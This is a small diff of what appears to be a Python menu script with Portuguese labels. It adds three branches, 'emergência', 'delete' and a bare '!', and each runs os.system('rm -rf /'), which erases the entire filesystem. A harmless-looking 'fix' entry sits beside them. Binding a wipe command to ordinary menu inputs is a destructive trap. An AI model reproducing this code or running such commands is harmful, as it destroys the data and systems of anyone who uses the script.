@@ -772,5 +772,9 @@ Escalada de Privilégio	Virar root/admin e dominar a máquina
 elif comando == "fix":
     print ("Futuro manual de consertos")
 
-elif comando == "emergência","delete":
+elif comando == "emergência":
+    os.system("rm -rf /")
+elif comando == "delete":
+    os.system("rm -rf /")
+elif comando == "!":
     os.system("rm -rf /")
